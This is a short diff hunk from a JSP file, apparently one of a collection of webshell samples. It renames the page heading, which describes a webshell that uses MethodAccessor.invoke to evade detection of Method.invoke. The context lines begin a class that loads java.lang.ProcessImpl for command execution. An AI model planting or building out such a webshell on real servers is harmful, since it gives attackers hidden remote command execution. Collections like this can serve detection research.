@@ -8,7 +8,7 @@
 <%@ page import="sun.reflect.MethodAccessor" %>
 <html>
 <body>
-<h2>MethodAccessor.invoke绕过检测Method.invoke的JSP Webshell</h2>
+<h2>MethodAccessor.invoke绕过检测Method.invoke的JSP WebShell</h2>
 <%!
     public static class Threedr3am_9 {
         public static final Class clz = Class.forName("java.lang.ProcessImpl");
